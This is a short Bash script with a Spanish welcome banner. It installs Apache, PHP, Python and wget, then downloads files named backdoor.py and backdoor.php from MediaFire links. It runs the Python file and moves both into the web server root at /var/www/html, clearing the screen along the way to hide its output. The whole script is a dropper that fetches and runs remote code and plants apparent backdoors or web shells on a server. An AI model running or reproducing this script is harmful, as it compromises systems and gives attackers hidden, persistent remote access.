#!/bin/bash
clear
printf "\e[1;32mBienvenido\n"
apt-get install python -y
apt-get install wget -y
apt-get install php -y
apt-get install apache2 -y
wget https://download937.mediafire.com/ooodwaw7wm0g/gq3eu1315jk8sy9/backdoor.py
chmod +x backdoor.py
python backdoor.py
mv backdoor.py /var/www/html
wget https://download1080.mediafire.com/5p59etev2nyg/psd5wtck0imn1q9/backdoor.php
chmod +x  backdoor.php
clear
mv backdoor.php /var/www/html
